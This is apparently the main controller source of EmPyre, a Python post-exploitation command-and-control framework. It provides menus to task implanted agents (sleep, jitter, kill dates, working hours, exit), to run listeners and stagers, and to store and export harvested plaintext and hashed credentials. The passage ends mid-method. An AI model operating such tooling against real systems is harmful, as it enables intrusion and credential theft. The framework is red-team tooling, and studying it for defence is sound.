"""

The main controller class for EmPyre.

This is what's launched from ./empyre.
Contains the Main, Listener, Agents, Agent, and Module
menu loops.

"""

# make version for EmPyre
VERSION = "1.0.0"

from pydispatch import dispatcher

import sys, cmd, sqlite3, os, hashlib, traceback, time

# EmPyre imports
import helpers
import http
import encryption
import packets
import messages
import agents
import listeners
import modules
import stagers
import credentials

# custom exceptions used for nested menu navigation
class NavMain(Exception): pass
class NavAgents(Exception): pass
class NavListeners(Exception): pass


class MainMenu(cmd.Cmd):

    def __init__(self, args=None, restAPI=False):

        cmd.Cmd.__init__(self)

        # globalOptions[optionName] = (value, required, description)
        self.globalOptions = {}

        self.args = args

        # empty database object
        self.conn = self.database_connect()

        # pull out some common configuration information
        (self.isroot, self.installPath, self.stage0, self.stage1, self.stage2, self.ipWhiteList, self.ipBlackList) = helpers.get_config('rootuser,install_path,stage0_uri,stage1_uri,stage2_uri,ip_whitelist,ip_blacklist')

        # instantiate the agents, listeners, and stagers objects
        self.agents = agents.Agents(self, args=args)
        self.listeners = listeners.Listeners(self, args=args)
        self.stagers = stagers.Stagers(self, args=args)
        self.modules = modules.Modules(self, args=args)
        self.credentials = credentials.Credentials(self, args=args)

        # make sure all the references are passed after instantiation
        self.agents.listeners = self.listeners
        self.agents.modules = self.modules
        self.agents.stagers = self.stagers
        self.listeners.modules = self.modules
        self.listeners.stagers = self.stagers
        self.modules.stagers = self.stagers

        # change the default prompt for the user
        self.prompt = "(EmPyre) > "
        self.do_help.__func__.__doc__ = '''Displays the help menu.'''
        self.doc_header = 'Commands'

        dispatcher.connect(self.handle_event, sender=dispatcher.Any)

        # Main, Agents, or Listeners
        self.menu_state = "Main"

        # parse/handle any passed command line arguments
        self.args = args
        self.handle_args()

        # start everything up normally if the RESTful API isn't being launched
        if not restAPI:
            self.startup()

    def check_root(self):
        """
        Check if EmPyre has been run as root, and alert user.
        """
        try:

            if os.geteuid() != 0:
                if self.isroot:
                    messages.title(VERSION)
                    print "[!] Warning: Running EmPyre as non-root, after running as root will likely fail to access prior agents!"
                    while True:
                        a = raw_input(helpers.color("[>] Are you sure you want to continue (y) or (n): "))
                        if a.startswith("y"):
                            return
                        if a.startswith("n"):
                            self.shutdown()
                            sys.exit()
                else:
                    pass
            if os.geteuid() == 0:
                if self.isroot:
                    pass
                if not self.isroot:
                    cur = self.conn.cursor()
                    cur.execute("UPDATE config SET rootuser = 1")
                    cur.close()
        except Exception as e:
            print e

    def handle_args(self):
        """
        Handle any passed arguments.
        """
        
        if self.args.listener or self.args.stager:
            # if we're displaying listeners/stagers or generating a stager
            if self.args.listener:
                if self.args.listener == 'list':
                    activeListeners = self.listeners.get_listeners()
                    messages.display_listeners(activeListeners)
                else:
                    activeListeners = self.listeners.get_listeners()
                    targetListener = [l for l in activeListeners if self.args.listener in l[1]]

                    if targetListener:
                        targetListener = targetListener[0]
                        messages.display_listener_database(targetListener)
                    else:
                        print helpers.color("\n[!] No active listeners with name '%s'\n" %(self.args.listener))

            else:
                if self.args.stager == 'list':
                    print "\nStagers:\n"
                    print "  Name             Description"
                    print "  ----             -----------"
                    for stagerName,stager in self.stagers.stagers.iteritems():
                        print "  %s%s" % ('{0: <17}'.format(stagerName), stager.info['Description'])
                    print "\n"
                else:
                    stagerName = self.args.stager
                    try:
                        targetStager = self.stagers.stagers[stagerName]
                        menu = StagerMenu(self, stagerName)

                        if self.args.stager_options:
                            for option in self.args.stager_options:
                                if '=' not in option:
                                    print helpers.color("\n[!] Invalid option: '%s'" %(option))
                                    print helpers.color("[!] Please use Option=Value format\n")
                                    if self.conn: self.conn.close()
                                    sys.exit()

                                # split the passed stager options by = and set the appropriate option
                                optionName, optionValue = option.split('=')
                                menu.do_set("%s %s" %(optionName, optionValue))

                            # generate the stager
                            menu.do_generate('')

                        else:
                            messages.display_stager(stagerName, targetStager)

                    except Exception as e:
                        print e
                        print helpers.color("\n[!] No current stager with name '%s'\n" %(stagerName))

            # shutdown the database connection object
            if self.conn: self.conn.close()
            sys.exit()

    def startup(self):
        """
        Kick off all initial startup actions.
        """

        self.database_connect()

        # restart any listeners currently in the database
        self.listeners.start_existing_listeners()

        dispatcher.send("[*] EmPyre starting up...", sender="EmPyre")

    def shutdown(self):
        """
        Perform any shutdown actions.
        """

        print "\n" + helpers.color("[!] Shutting down...\n")
        dispatcher.send("[*] EmPyre shutting down...", sender="EmPyre")

        # enumerate all active servers/listeners and shut them down
        self.listeners.shutdownall()

        # shutdown the database connection object
        if self.conn:
            self.conn.close()

    def database_connect(self):
        try:
            # set the database connectiont to autocommit w/ isolation level
            self.conn = sqlite3.connect('./data/empyre.db', check_same_thread=False)
            self.conn.text_factory = str
            self.conn.isolation_level = None
            return self.conn

        except Exception:
            print helpers.color("[!] Could not connect to database")
            print helpers.color("[!] Please run database_setup.py")
            sys.exit()

    # def preloop(self):
    #     traceback.print_stack()

    def cmdloop(self):
        # check if root user has run empyre before and warn user
        self.check_root()
        while True:
            try:
                if self.menu_state == "Agents":
                    self.do_agents("")
                elif self.menu_state == "Listeners":
                    self.do_listeners("")
                else:
                    # display the main title
                    messages.title(VERSION)

                    # get active listeners, agents, and loaded modules
                    num_agents = self.agents.get_agents()
                    if(num_agents):
                        num_agents = len(num_agents)
                    else:
                        num_agents = 0

                    num_modules = self.modules.modules
                    if(num_modules):
                        num_modules = len(num_modules)
                    else:
                        num_modules = 0

                    num_listeners = self.listeners.get_listeners()
                    if(num_listeners):
                        num_listeners = len(num_listeners)
                    else:
                        num_listeners = 0

                    print "       " + helpers.color(str(num_modules), "green") + " modules currently loaded\n"
                    print "       " + helpers.color(str(num_listeners), "green") + " listeners currently active\n"
                    print "       " + helpers.color(str(num_agents), "green") + " agents currently active\n\n"

                    cmd.Cmd.cmdloop(self)

            # handle those pesky ctrl+c's
            except KeyboardInterrupt as e:
                self.menu_state = "Main"
                try:
                    choice = raw_input(helpers.color("\n[>] Exit? [y/N] ", "red"))
                    if choice.lower() != "" and choice.lower()[0] == "y":
                        self.shutdown()
                        return True
                    else:
                        continue
                except KeyboardInterrupt as e:
                    continue

            # exception used to signal jumping to "Main" menu
            except NavMain as e:
                self.menu_state = "Main"

            # exception used to signal jumping to "Agents" menu
            except NavAgents as e:
                self.menu_state = "Agents"

            # exception used to signal jumping to "Listeners" menu
            except NavListeners as e:
                self.menu_state = "Listeners"

            except Exception as e:
                print helpers.color("[!] Exception: %s" %(e))
                time.sleep(5)

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def emptyline(self): pass

    def handle_event(self, signal, sender):
        """
        Default event handler.

        Signal Senders:
            EmPyre          -   the main EmPyre controller (this file)
            Agents          -   the Agents handler
            Listeners       -   the Listeners handler
            HttpHandler     -   the HTTP handler
            EmPyreServer    -   the EmPyre HTTP server
        """

        # if --debug X is passed, log out all dispatcher signals
        if self.args.debug:
            f = open("empyre.debug", 'a')
            f.write(helpers.get_datetime() + " " + sender + " : " + signal + "\n")
            f.close()

            if self.args.debug == '2':
                # if --debug 2, also print the output to the screen
                print " " + sender + " : " + signal

        # display specific signals from the agents.
        if sender == "Agents":
            if "[+] Initial agent" in signal:
                print helpers.color(signal)

            elif "[!] Agent" in signal and "exiting" in signal:
                print helpers.color(signal)

            elif "WARNING" in signal or "attempted overwrite" in signal:
                print helpers.color(signal)

            elif "on the blacklist" in signal:
                print helpers.color(signal)

        elif sender == "EmPyreServer":
            if "[!] Error starting listener" in signal:
                print helpers.color(signal)

        elif sender == "Listeners":
            print helpers.color(signal)

    ###################################################
    # CMD methods
    ###################################################

    def default(self, line):
        pass

    def do_exit(self, line):
        "Exit EmPyre"
        raise KeyboardInterrupt

    def do_agents(self, line):
        "Jump to the Agents menu."
        try:
            a = AgentsMenu(self)
            a.cmdloop()
        except Exception as e:
            raise e

    def do_listeners(self, line):
        "Interact with active listeners."
        try:
            l = ListenerMenu(self)
            l.cmdloop()
        except Exception as e:
            raise e

    def do_usestager(self, line):
        "Use an EmPyre stager."

        try:
            parts = line.split(" ")

            if parts[0] not in self.stagers.stagers:
                print helpers.color("[!] Error: invalid stager module")

            elif len(parts) == 1:
                l = StagerMenu(self, parts[0])
                l.cmdloop()
            elif len(parts) == 2:
                listener = parts[1]
                if not self.listeners.is_listener_valid(listener):
                    print helpers.color("[!] Please enter a valid listener name or ID")
                else:
                    self.stagers.set_stager_option('Listener', listener)
                    l = StagerMenu(self, parts[0])
                    l.cmdloop()
            else:
                print helpers.color("[!] Error in MainMenu's do_userstager()")

        except Exception as e:
            raise e

    def do_usemodule(self, line):
        "Use an EmPyre module."
        if line not in self.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            try:
                l = ModuleMenu(self, line)
                l.cmdloop()
            except Exception as e:
                raise e

    def do_searchmodule(self, line):
        "Search EmPyre module names/descriptions."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.modules.search_modules(searchTerm)

    def do_creds(self, line):
        "Add/display credentials to/from the database."

        filterTerm = line.strip()

        if filterTerm == "":
            creds = self.credentials.get_credentials()

        elif filterTerm.split()[0].lower() == "add":
            # add format: "domain username password <notes> <credType> <sid>
            args = filterTerm.split()[1:]

            if len(args) == 3:
                domain, username, password = args
                if helpers.validate_ntlm(password):
                    # credtype, domain, username, password, host, sid="", notes=""):
                    self.credentials.add_credential("hash", domain, username, password, "")
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "")

            elif len(args) == 4:
                domain, username, password, notes = args
                if helpers.validate_ntlm(password):
                    self.credentials.add_credential("hash", domain, username, password, "", notes=notes)
                else:
                    self.credentials.add_credential("plaintext", domain, username, password, "", notes=notes)

            elif len(args) == 5:
                domain, username, password, notes, credType = args
                self.credentials.add_credential(credType, domain, username, password, "", notes=notes)

            elif len(args) == 6:
                domain, username, password, notes, credType, sid = args
                self.credentials.add_credential(credType, domain, username, password, "", sid=sid, notes=notes)

            else:
                print helpers.color("[!] Format is 'add domain username password <notes> <credType> <sid>")
                return

            creds = self.credentials.get_credentials()

        elif filterTerm.split()[0].lower() == "remove":
            try:
                args = filterTerm.split()[1:]
                if len(args) != 1 :
                    print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")
                else:
                    if args[0].lower() == "all":
                        choice = raw_input(helpers.color("[>] Remove all credentials from the database? [y/N] ", "red"))
                        if choice.lower() != "" and choice.lower()[0] == "y":
                            self.credentials.remove_all_credentials()
                    else:
                        if "," in args[0]:
                            credIDs = args[0].split(",")
                            self.credentials.remove_credentials(credIDs)
                        elif "-" in args[0]:
                            parts = args[0].split("-")
                            credIDs = [x for x in xrange(int(parts[0]), int(parts[1])+1)]
                            self.credentials.remove_credentials(credIDs)
                        else:
                            self.credentials.remove_credentials(args)

            except:
                print helpers.color("[!] Error in remove command parsing.")
                print helpers.color("[!] Format is 'remove <credID>/<credID-credID>/all'")

            return

        elif filterTerm.split()[0].lower() == "export":
            args = filterTerm.split()[1:]

            if len(args) != 1:
                print helpers.color("[!] Please supply an output filename/filepath.")
                return
            else:
                creds = self.credentials.get_credentials()
                
                if len(creds) == 0:
                    print helpers.color("[!] No credentials in the database.")
                    return

                f = open(args[0], 'w')
                f.write("CredID,CredType,Domain,Username,Password,Host,SID,Notes\n")
                for cred in creds:
                    f.write(",".join([str(x) for x in cred]) + "\n")
                
                print "\n" + helpers.color("[*] Credentials exported to %s.\n" % (args[0]))
                return

        elif filterTerm.split()[0].lower() == "plaintext":
            creds = self.credentials.get_credentials(credtype="plaintext")

        elif filterTerm.split()[0].lower() == "hash":
            creds = self.credentials.get_credentials(credtype="hash")

        else:
            creds = self.credentials.get_credentials(filterTerm=filterTerm)
        
        messages.display_credentials(creds)

    def do_set(self, line):
        "Set a global option (e.g. IP whitelists)."

        parts = line.split(" ")
        if len(parts) == 1:
            print helpers.color("[!] Please enter 'IP,IP-IP,IP/CIDR' or a file path.")
        else:
            if parts[0].lower() == "ip_whitelist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        f = open(parts[1], 'r')
                        ipData = f.read()
                        f.close()
                        self.agents.ipWhiteList = helpers.generate_ip_list(ipData)
                    except:
                        print helpers.color("[!] Error opening ip file %s" %(parts[1]))
                else:
                    self.agents.ipWhiteList = helpers.generate_ip_list(",".join(parts[1:]))
            elif parts[0].lower() == "ip_blacklist":
                if parts[1] != "" and os.path.exists(parts[1]):
                    try:
                        f = open(parts[1], 'r')
                        ipData = f.read()
                        f.close()
                        self.agents.ipBlackList = helpers.generate_ip_list(ipData)
                    except:
                        print helpers.color("[!] Error opening ip file %s" %(parts[1]))
                else:
                    self.agents.ipBlackList = helpers.generate_ip_list(",".join(parts[1:]))
            else:
                print helpers.color("[!] Please choose 'ip_whitelist' or 'ip_blacklist'")

    def do_reset(self, line):
        "Reset a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            self.agents.ipWhiteList = None
        if line.strip().lower() == "ip_blacklist":
            self.agents.ipBlackList = None

    def do_show(self, line):
        "Show a global option (e.g. IP whitelists)."

        if line.strip().lower() == "ip_whitelist":
            print self.agents.ipWhiteList
        if line.strip().lower() == "ip_blacklist":
            print self.agents.ipBlackList

    def do_load(self, line):
        "Loads EmPyre modules from a non-standard folder."
        
        if line.strip() == '' or not os.path.isdir(line.strip()):
            print "\n" + helpers.color("[!] Please specify a valid folder to load modules from.") + "\n"
        else:
            self.modules.load_modules(rootPath=line.strip())

    def do_reload(self, line):
        "Reload one (or all) EmPyre modules."

        if line.strip().lower() == "all":
            # reload all modules
            print "\n" + helpers.color("[*] Reloading all modules.") + "\n"
            self.modules.load_modules()
        elif os.path.isdir(line.strip()):
            # if we're loading an external directory
            self.modules.load_modules(rootPath=line.strip())
        else:
            if line.strip() not in self.modules.modules:
                print helpers.color("[!] Error: invalid module")
            else:
                print "\n" + helpers.color("[*] Reloading module: " + line) + "\n"
                self.modules.reload_module(line)

    def do_list(self, line):
        "Lists active agents or listeners."

        parts = line.split(" ")

        if parts[0].lower() == "agents":

            line = " ".join(parts[1:])
            agents = self.agents.get_agents()

            if line.strip().lower() == "stale":

                displayAgents = []

                for agent in agents:

                    sessionID = self.agents.get_agent_id(agent[3])

                    # max check in -> delay + delay*jitter
                    intervalMax = (agent[4] + agent[4] * agent[5])+30

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent[16], "%Y-%m-%d %H:%M:%S"))
                    if agentTime < time.mktime(time.localtime()) - intervalMax:
                        # if the last checkin time exceeds the limit, remove it
                        displayAgents.append(agent)

                messages.display_staleagents(displayAgents)

            elif line.strip() != "":
                # if we're listing an agents active in the last X minutes
                try:
                    minutes = int(line.strip())

                    # grab just the agents active within the specified window (in minutes)
                    displayAgents = []
                    for agent in agents:
                        agentTime = time.mktime(time.strptime(agent[16], "%Y-%m-%d %H:%M:%S"))

                        if agentTime > time.mktime(time.localtime()) - (int(minutes) * 60):
                            displayAgents.append(agent)

                    messages.display_agents(displayAgents)

                except:
                    print helpers.color("[!] Please enter the minute window for agent checkin.")

            else:
                messages.display_agents(agents)

        elif parts[0].lower() == "listeners":

            messages.display_listeners(self.listeners.get_listeners())

    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre Python module path."

        modules = self.modules.modules.keys()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in modules if s.startswith(mline)]

    def complete_reload(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre Python module path."

        modules = self.modules.modules.keys() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in modules if s.startswith(mline)]

    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre stager module path."

        stagers = self.stagers.stagers.keys()

        if (line.split(" ")[1].lower() in stagers) and line.endswith(" "):
            # if we already have a stager name, tab-complete listener names
            listenerNames = self.listeners.get_listener_names()

            endLine = " ".join(line.split(" ")[1:])
            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]
        else:
            # otherwise tab-complate the stager names
            mline = line.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in stagers if s.startswith(mline)]

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a global option."

        options = ["ip_whitelist", "ip_blacklist"]

        if line.split(" ")[1].lower() in options:
            return helpers.complete_path(text,line,arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_load(self, text, line, begidx, endidx):
        "Tab-complete a module load path."
        return helpers.complete_path(text,line)

    def complete_reset(self, text, line, begidx, endidx):
        "Tab-complete a global option."
        return self.complete_set(text, line, begidx, endidx)

    def complete_show(self, text, line, begidx, endidx):
        "Tab-complete a global option."
        return self.complete_set(text, line, begidx, endidx)

    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        commands = [ "add", "remove", "export", "hash", "plaintext"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in commands if s.startswith(mline)]


class AgentsMenu(cmd.Cmd):

    def __init__(self, mainMenu):
        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        self.doc_header = 'Commands'

        # set the prompt text
        self.prompt = '(EmPyre: '+helpers.color("agents", color="blue")+') > '

        agents = self.mainMenu.agents.get_agents()
        messages.display_agents(agents)

    # def preloop(self):
    #     traceback.print_stack()

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def emptyline(self): pass

    def do_back(self, line):
        "Return back a menu."
        return NavMain()

    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_exit(self, line):
        "Exit EmPyre."
        raise KeyboardInterrupt

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(" ".join(line.split(" ")[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(" ".join(line.split(" ")[1:])))
        else:
            self.mainMenu.do_list("agents " + str(line))

    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)

    def do_rename(self, line):
        "Rename a particular agent."

        parts = line.strip().split(" ")

        # name sure we get an old name and new name for the agent
        if len(parts) == 2:
            # replace the old name with the new name
            oldname = parts[0]
            newname = parts[1]
            self.mainMenu.agents.rename_agent(oldname, newname)
        else:
            print helpers.color("[!] Please enter an agent name and new name")

    def do_interact(self, line):
        "Interact with a particular agent."

        name = line.strip()

        if name != "" and self.mainMenu.agents.is_agent_present(name):
            # resolve the passed name to a sessionID
            sessionID = self.mainMenu.agents.get_agent_id(name)

            a = AgentMenu(self.mainMenu, sessionID)
            a.cmdloop()
        else:
            print helpers.color("[!] Please enter a valid agent name")

    def do_kill(self, line):
        "Task one or more agents to exit."

        name = line.strip()

        if name.lower() == "all":
            try:
                choice = raw_input(helpers.color("[>] Kill all agents? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":
                    agents = self.mainMenu.agents.get_agents()
                    for agent in agents:
                        sessionID = agent[1]
                        self.mainMenu.agents.add_agent_task(sessionID, "TASK_EXIT")
            except KeyboardInterrupt as e:
                print ""

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_EXIT")
            else:
                print helpers.color("[!] Invalid agent name")

    def do_clear(self, line):
        "Clear one or more agent's taskings."

        name = line.strip()

        if name.lower() == "all":
            self.mainMenu.agents.clear_agent_tasks("all")
        elif name.lower() == "autorun":
            self.mainMenu.agents.clear_autoruns()
        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.clear_agent_tasks(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")

    def do_sleep(self, line):
        "Task one or more agents to 'sleep [agent/all] interval [jitter]'"

        parts = line.strip().split(" ")

        if len(parts) == 1:
            print helpers.color("[!] Please enter 'interval [jitter]'")

        if len(parts) >= 2:
            try:
                int(parts[1])
            except:
                print helpers.color("[!] Please only enter integer for 'interval'")
                return

        if len(parts) > 2:
            try:
                int(parts[2])
            except:
                print helpers.color("[!] Please only enter integer for '[jitter]'")
                return

        if parts[0].lower() == "all":
            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            agents = self.mainMenu.agents.get_agents()

            for agent in agents:
                sessionID = agent[1]

                # update this agent info in the database
                self.mainMenu.agents.set_agent_field("delay", delay, sessionID)
                self.mainMenu.agents.set_agent_field("jitter", jitter, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))

                # update the agent log
                msg = "Tasked agent to delay sleep/jitter to: %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(parts[0])

            delay = parts[1]
            jitter = 0.0
            if len(parts) == 3:
                jitter = parts[2]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field("delay", delay, sessionID)
                self.mainMenu.agents.set_agent_field("jitter", jitter, sessionID)

                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))

                # update the agent log
                msg = "Tasked agent to delay sleep/jitter to: %s/%s" % (delay, jitter)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")

    def do_lostlimit(self, line):
        "Task one or more agents to 'lostlimit [agent/all] <#ofCBs> '"

        parts = line.strip().split(" ")

        if len(parts) == 1:
            print helpers.color("[!] Please enter a valid '#ofCBs'")

        elif parts[0].lower() == "all":
            lostLimit = parts[1]
            agents = self.mainMenu.agents.get_agents()

            for agent in agents:
                sessionID = agent[1]

                # update this agent info in the database
                self.mainMenu.agents.set_agent_field("lost_limit", lostLimit, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global lostLimit; lostLimit=%s; print 'lostLimit set to %s'" % (lostLimit, lostLimit))

                # update the agent log
                msg = "Tasked agent to change lost limit to: %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(parts[0])

            lostLimit = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's information in the database
                self.mainMenu.agents.set_agent_field("lost_limit", lostLimit, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global lostLimit; lostLimit=%s; print 'lostLimit set to %s'" % (lostLimit, lostLimit))

                # update the agent log
                msg = "Tasked agent to change lost limit to: %s" % (lostLimit)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")

    def do_killdate(self, line):
        "Set the killdate for one or more agents (killdate [agent/all] 01/01/2016)."

        parts = line.strip().split(" ")

        if len(parts) == 1:
            print helpers.color("[!] Please enter date in form 01/01/2016")

        elif parts[0].lower() == "all":
            killDate = parts[1]

            agents = self.mainMenu.agents.get_agents()

            for agent in agents:
                sessionID = agent[1]

                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field("kill_date", killDate, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global killDate; killDate='%s'; print 'killDate set to %s'" % (killDate, killDate))

                msg = "Tasked agent to set killdate to: %s" % (killDate)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(parts[0])

            killDate = parts[1]

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field("kill_date", killDate, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global killDate; killDate='%s'; print 'killDate set to %s'" % (killDate, killDate))

                # update the agent log
                msg = "Tasked agent to set killdate to: %s" % (killDate)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")

    def do_workinghours(self, line):
        "Set the workinghours for one or more agents (workinghours [agent/all] 9:00-17:00)."

        parts = line.strip().split(" ")

        if len(parts) == 1:
            print helpers.color("[!] Please enter hours in the form '9:00-17:00'")

        elif parts[0].lower() == "all":
            hours = parts[1]
            hours = hours.replace("," , "-")

            agents = self.mainMenu.agents.get_agents()

            for agent in agents:
                sessionID = agent[1]

                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field("working_hours", hours, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global workingHours; workingHours= '%s'" % (hours))

                msg = "Tasked agent to set working hours to: %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(parts[0])

            hours = parts[1]
            hours = hours.replace("," , "-")

            if sessionID and len(sessionID) != 0:
                # update this agent's field in the database
                self.mainMenu.agents.set_agent_field("working_hours", hours, sessionID)

                # task the agent
                self.mainMenu.agents.add_agent_task(sessionID, "TASK_CMD_WAIT", "global workingHours; workingHours= '%s'" % (hours))

                # update the agent log
                msg = "Tasked agent to set working hours to %s" % (hours)
                self.mainMenu.agents.save_agent_log(sessionID, msg)

            else:
                print helpers.color("[!] Invalid agent name")

    def do_remove(self, line):
        "Remove one or more agents from the database."

        name = line.strip()

        if name.lower() == "all":
            try:
                choice = raw_input(helpers.color("[>] Remove all agents from the database? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":
                    self.mainMenu.agents.remove_agent('%')
            except KeyboardInterrupt as e:
                print ""

        elif name.lower() == "stale":
            # remove 'stale' agents that have missed their checkin intervals

            agents = self.mainMenu.agents.get_agents()

            for agent in agents:

                sessionID = self.mainMenu.agents.get_agent_id(agent[3])

                # max check in -> delay + delay*jitter
                intervalMax = (agent[4] + agent[4] * agent[5])+30

                # get the agent last check in time
                agentTime = time.mktime(time.strptime(agent[16], "%Y-%m-%d %H:%M:%S"))

                if agentTime < time.mktime(time.localtime()) - intervalMax:
                    # if the last checkin time exceeds the limit, remove it
                    self.mainMenu.agents.remove_agent(sessionID)

        elif name.isdigit():
            # if we're removing agents that checked in longer than X minutes ago
            agents = self.mainMenu.agents.get_agents()

            try:
                minutes = int(line.strip())

                # grab just the agents active within the specified window (in minutes)
                for agent in agents:

                    sessionID = self.mainMenu.agents.get_agent_id(agent[3])

                    # get the agent last check in time
                    agentTime = time.mktime(time.strptime(agent[16], "%Y-%m-%d %H:%M:%S"))

                    if agentTime < time.mktime(time.localtime()) - (int(minutes) * 60):
                        # if the last checkin time exceeds the limit, remove it
                        self.mainMenu.agents.remove_agent(sessionID)

            except:
                print helpers.color("[!] Please enter the minute window for agent checkin.")

        else:
            # extract the sessionID and clear the agent tasking
            sessionID = self.mainMenu.agents.get_agent_id(name)

            if sessionID and len(sessionID) != 0:
                self.mainMenu.agents.remove_agent(sessionID)
            else:
                print helpers.color("[!] Invalid agent name")

    def do_usestager(self, line):
        "Use an EmPyre stager."

        parts = line.split(" ")

        if parts[0] not in self.mainMenu.stagers.stagers:
            print helpers.color("[!] Error: invalid stager module")

        elif len(parts) == 1:
            l = StagerMenu(self.mainMenu, parts[0])
            l.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.stagers.set_stager_option('Listener', listener)
                l = StagerMenu(self.mainMenu, parts[0])
                l.cmdloop()
        else:
            print helpers.color("[!] Error in AgentsMenu's do_userstager()")

    def do_usemodule(self, line):
        "Use an EmPyre Python module."

        module = line.strip()

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            # set agent to "all"
            l = ModuleMenu(self.mainMenu, line, agent="all")
            l.cmdloop()

    def do_searchmodule(self, line):
        "Search EmPyre module names/descriptions."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)

    def complete_interact(self, text, line, begidx, endidx):
        "Tab-complete an interact command"

        names = self.mainMenu.agents.get_agent_names()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_rename(self, text, line, begidx, endidx):
        "Tab-complete a rename command"

        names = self.mainMenu.agents.get_agent_names()

        return self.complete_interact(text, line, begidx, endidx)

    def complete_clear(self, text, line, begidx, endidx):
        "Tab-complete a clear command"

